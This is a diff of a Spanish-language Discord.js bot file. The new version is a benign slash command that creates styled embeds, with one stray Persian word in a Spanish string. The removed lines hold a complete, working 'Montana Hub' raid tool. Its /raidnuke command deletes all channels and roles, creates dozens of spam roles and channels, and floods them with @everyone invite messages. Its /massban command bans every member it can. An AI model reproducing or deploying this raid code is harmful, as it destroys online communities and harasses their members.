@@ -1,221 +1,118 @@
-/**
- * ============================================================================
- * PROJECT: MONTANA HUB - ADVANCED DISCORD AUTOMATION & RAID ENGINE
- * ARCHITECTURE: Discord.js v14 + REST API Handler
- * AUTHOR: Montana Team (discord.gg/pMya4QTDKz)
- * ============================================================================
- */
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 
-const { 
-    Client, 
-    GatewayIntentBits, 
-    REST, 
-    Routes, 
-    SlashCommandBuilder, 
-    PermissionFlagsBits 
-} = require('discord.js');
-require('dotenv').config();
+const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-// Inicialización del cliente con todos los intents necesarios para control total
-const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildModeration
-    ]
-});
-
-// Constante de contenido de spam con mención global y enlace definitivo
-const TARGET_INVITE = "https://discord.gg/pMya4QTDKz";
-const SPAM_MESSAGE_PAYLOAD = `@everyone RAID BY MONTANA ON TOP\nJOIN DISCORD MONTANA ON TOP\n${TARGET_INVITE}`;
-
-// Colección de nombres terroríficos para saturación de canales
-const SCARY_CHANNEL_PREFIXES = [
-    "💀ʀᴀɪᴅ-ʙʏ-ᴍᴏɴᴛᴀɴᴀ💀",
-    "⚰️ᴍᴏɴᴛᴀɴᴀ-ᴏɴ-ᴛᴏᴘ⚰️",
-    "🩸ᴅᴇsᴛʀᴜᴄᴄɪᴏɴ-ᴛᴏᴛᴀʟ🩸",
-    "🕳️sɪɴ-ᴇsᴄᴀᴘᴇ🕳️",
-    "⚡ʜᴀᴄᴋᴇᴅ-ʙʏ-ᴍᴏɴᴛᴀɴᴀ⚡"
-];
-
-/**
- * Evento principal: Ejecutado cuando el bot se conecta exitosamente a la API de Discord.
- */
 client.once('ready', async () => {
-    console.log(`[CORE STATUS]: Bot conectado e identificado exitosamente como -> ${client.user.tag}`);
-    console.log(`[CORE STATUS]: Preparando registro global de comandos Slash...`);
+    console.log(`¡Bot conectado con éxito como ${client.user.tag}!`);
 
-    // Definición formal de comandos Slash compatibles con la API v10 de Discord
-    const applicationCommandsRegistry = [
+    // Definición del comando slash elegante
+    const commands = [
         new SlashCommandBuilder()
-            .setName('raidnuke')
-            .setDescription('Ejecuta protocolo integral de destrucción: borrado masivo y recreación de canales/roles.')
-            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-        new SlashCommandBuilder()
-            .setName('massban')
-            .setDescription('Ejecuta baneo masivo e instantáneo en el servidor actual sin restricciones.')
-            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
-    ].map(command => command.toJSON());
+            .setName('embed')
+            .setDescription('Crea un anuncio o embed profesional y elegante')
+            .addStringOption(option =>
+                option.setName('titulo')
+                    .setDescription('Título principal del embed')
+                    .setRequired(true))
+            .addStringOption(option =>
+                option.setName('descripcion')
+                    .setDescription('Mensaje principal o contenido del embed')
+                    .setRequired(true))
+            .addStringOption(option =>
+                option.setName('footer')
+                    .setDescription('Texto pequeño para el pie de página (Opcional)')
+                    .setRequired(false))
+    ];
 
-    const restApiManager = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
+    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
 
     try {
-        console.log('[API REST]: Sincronizando comandos de aplicación con Discord...');
-        await restApiManager.put(
-            Routes.applicationCommands(process.env.CLIENT_ID),
-            { body: applicationCommandsRegistry }
+        console.log('Actualizando comandos de barra (/) ...');
+        await rest.put(
+            Routes.applicationCommands(client.user.id),
+            { body: commands },
         );
-        console.log('[API REST]: Comandos slash registrados y listos para su uso.');
-    } catch (registryError) {
-        console.error('[API ERROR]: Fallo crítico al registrar los comandos Slash:', registryError);
+        console.log('¡Comandos globales registrados correctamente!');
+    } catch (error) {
+        console.error('Error al registrar comandos:', error);
     }
 });
 
-/**
- * Manejador de interacciones y comandos ejecutados por los usuarios.
- */
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
-    const { commandName, guild } = interaction;
+    if (interaction.commandName === 'embed') {
+        const titulo = interaction.options.getString('titulo');
+        const descripcion = interaction.options.getString('descripcion');
+        const footerTexto = interaction.options.getString('footer') || `Creado por ${interaction.user.tag}`;
 
-    if (!guild) {
-        return interaction.reply({ 
-            content: '❌ Este comando solo puede ser ejecutado dentro de un servidor.', 
-            ephemeral: true 
+        // Menú desplegable con colores estéticos y modernos
+        const row = new ActionRowBuilder().addComponents(
+            new StringSelectMenuBuilder()
+                .setCustomId('select_embed_color')
+                .setPlaceholder('🎨 Elige la gama de colores de tu Embed')
+                .addOptions([
+                    { label: 'Azul Neón / Cyber', value: '#2F3136_blue', description: 'Azul eléctrico moderno (#0099FF)', emoji: '💠' },
+                    { label: 'Verde Esmeralda', value: '#2F3136_green', description: 'Ideal para aceptaciones o éxito (#2ECC71)', emoji: '🟢' },
+                    { label: 'Rojo Alerta / Importante', value: '#2F3136_red', description: 'Ideal برای avisos o reglas (#E74C3C)', emoji: '🔴' },
+                    { label: 'Dorado / Premium', value: '#2F3136_gold', description: 'Estilo elegante y lujoso (#F1C40F)', emoji: '🟡' },
+                    { label: 'Morado / Violeta', value: '#2F3136_purple', description: 'Estilo oscuro y limpio (#9B59B6)', emoji: '🟣' },
+                    { label: 'Negro Oscuro (Minimalista)', value: '#23272A', description: 'Diseño sobrio y profesional (#23272A)', emoji: '⬛' }
+                ]),
+        );
+
+        await interaction.reply({
+            content: `✨ Has redactado tu embed con éxito.\n👇 **Paso final:** Selecciona el estilo de color que deseas aplicar:`,
+            components: [row],
+            ephemeral: true
         });
-    }
 
-    // =========================================================================
-    // COMANDO: /raidnuke
-    // =========================================================================
-    if (commandName === 'raidnuke') {
-        // Diferimos la respuesta para evitar tiempos de espera de la API de Discord
-        await interaction.deferReply({ ephemeral: true });
+        // Colector seguro para la respuesta del usuario (duración 2 minutos)
+        const filter = i => i.user.id === interaction.user.id;
+        const collector = interaction.channel.createMessageComponentCollector({ filter, time: 120000 });
 
-        try {
-            console.log(`[RAID ENGINE]: Iniciando protocolo de limpieza en el servidor: ${guild.name}`);
+        collector.on('collect', async i => {
+            if (i.customId === 'select_embed_color') {
+                let colorHex = '#5865F2'; // Color por defecto
 
-            // 1. Fase de Eliminación de Canales Existentes
-            const fetchedGuildChannels = await guild.channels.fetch();
-            let channelDeletionCounter = 0;
-
-            for (const [channelId, channelInstance] of fetchedGuildChannels) {
-                try {
-                    await channelInstance.delete();
-                    channelDeletionCounter++;
-                } catch (channelDeleteError) {
-                    // Ignora canales protegidos que el bot no pueda borrar por jerarquía
+                // Asignar colores basados en la selección
+                switch (i.values[0]) {
+                    case '#2F3136_blue': colorHex = '#0099FF'; break;
+                    case '#2F3136_green': colorHex = '#2ECC71'; break;
+                    case '#2F3136_red': colorHex = '#E74C3C'; break;
+                    case '#2F3136_gold': colorHex = '#F1C40F'; break;
+                    case '#2F3136_purple': colorHex = '#9B59B6'; break;
+                    case '#23272A': colorHex = '#23272A'; break;
                 }
-            }
-            console.log(`[RAID ENGINE]: Canales eliminados con éxito: ${channelDeletionCounter}`);
 
-            // 2. Fase de Eliminación de Roles Previos
-            const fetchedGuildRoles = await guild.roles.fetch();
-            let roleDeletionCounter = 0;
-
-            for (const [roleId, roleInstance] of fetchedGuildRoles) {
-                try {
-                    if (roleInstance.editable && roleInstance.name !== '@everyone') {
-                        await roleInstance.delete();
-                        roleDeletionCounter++;
-                    }
-                } catch (roleDeleteError) {
-                    // Ignora roles de mayor jerarquía que el bot
-                }
-            }
-            console.log(`[RAID ENGINE]: Roles antiguos eliminados: ${roleDeletionCounter}`);
-
-            // 3. Fase de Creación Masiva de Roles Nuevos (90 Roles)
-            let rolesCreatedCounter = 0;
-            for (let roleIndex = 1; roleIndex <= 90; roleIndex++) {
-                try {
-                    await guild.roles.create({
-                        name: `Montana Hub : ${TARGET_INVITE}`,
-                        color: 'Random',
-                        reason: 'Montana Security System - Raid Protocol'
-                    });
-                    rolesCreatedCounter++;
-                } catch (roleCreationError) {
-                    // Control de límite de tasa de la API (Rate limit bypass catch)
-                }
-            }
-            console.log(`[RAID ENGINE]: Roles masivos creados: ${rolesCreatedCounter}`);
-
-            // 4. Fase de Creación y Saturación de Canales (80 Canales con Spam Masivo)
-            let channelsCreatedCounter = 0;
-            for (let channelIndex = 1; channelIndex <= 80; channelIndex++) {
-                try {
-                    const selectedPrefix = SCARY_CHANNEL_PREFIXES[(channelIndex - 1) % SCARY_CHANNEL_PREFIXES.length];
-                    const constructedChannelName = `${selectedPrefix}-${channelIndex}`;
-
-                    const newlyCreatedChannel = await guild.channels.create({
-                        name: constructedChannelName,
-                        type: 0 // Tipo de canal: Texto
+                // Construcción del Embed elegante
+                const elegantEmbed = new EmbedBuilder()
+                    .setTitle(`📌 ${titulo}`)
+                    .setDescription(descripcion)
+                    .setColor(colorHex)
+                    .setTimestamp()
+                    .setFooter({ 
+                        text: footerTexto, 
+                        iconURL: interaction.user.displayAvatarURL() 
                     });
 
-                    channelsCreatedCounter++;
+                await i.update({ 
+                    content: '🚀 **¡Embed publicado con éxito en el canal!**', 
+                    components: [] 
+                });
 
-                    // Bucle interno de envío masivo de mensajes de spam (50 mensajes por canal)
-                    for (let messageIndex = 0; messageIndex < 50; messageIndex++) {
-                        await newlyCreatedChannel.send(SPAM_MESSAGE_PAYLOAD).catch(() => {});
-                    }
-                } catch (channelBuildingError) {
-                    // Control de flujo ante restricciones de creación masiva
-                }
+                await interaction.channel.send({ embeds: [elegantEmbed] });
+                collector.stop();
             }
-            console.log(`[RAID ENGINE]: Canales creados y spameados: ${channelsCreatedCounter}`);
+        });
 
-            await interaction.editReply({ 
-                content: '💀 **¡PROTOCOLO NUKES & RAID EJECUTADO EXITOSAMENTE POR MONTANA HUB!**' 
-            });
-
-        } catch (globalExecutionError) {
-            console.error('[CRITICAL ERROR]: Error durante la ejecución del comando /raidnuke:', globalExecutionError);
-            await interaction.editReply({ 
-                content: '❌ Ocurrió un error crítico al procesar el protocolo de destrucción.' 
-            });
-        }
-    }
-
-    // =========================================================================
-    // COMANDO: /massban
-    // =========================================================================
-    if (commandName === 'massban') {
-        await interaction.deferReply({ ephemeral: true });
-
-        try {
-            console.log(`[BAN ENGINE]: Iniciando barrido de expulsión y baneo en: ${guild.name}`);
-            
-            const allServerMembers = await guild.members.fetch();
-            let totalBannedCount = 0;
-
-            for (const [memberId, memberInstance] of allServerMembers) {
-                try {
-                    if (memberInstance.bannable && memberInstance.id !== client.user.id) {
-                        await memberInstance.ban({ reason: `Montana Hub Global Ban - ${TARGET_INVITE}` });
-                        totalBannedCount++;
-                    }
-                } catch (individualBanError) {
-                    // Omite miembros con protecciones o roles superiores
-                }
+        collector.on('end', collected => {
+            if (collected.size === 0) {
+                interaction.editReply({ content: '⏱️ El tiempo para seleccionar el color ha expirado. Usa `/embed` de nuevo.', components: [] }).catch(() => {});
             }
-
-            console.log(`[BAN ENGINE]: Proceso finalizado. Total de usuarios baneados: ${totalBannedCount}`);
-            await interaction.editReply({ 
-                content: `⚡ **¡BARRIDO TOTAL COMPLETADO! Miembros baneados con éxito: ${totalBannedCount}**` 
-            });
-
-        } catch (massBanEngineError) {
-            console.error('[CRITICAL ERROR]: Error en el proceso de baneo masivo:', massBanEngineError);
-            await interaction.editReply({ 
-                content: '❌ Error al ejecutar el baneo masivo en el servidor.' 
-            });
-        }
+        });
     }
 });
 
-// Autenticación final del bot utilizando el token privado del entorno
 client.login(process.env.DISCORD_TOKEN);
+
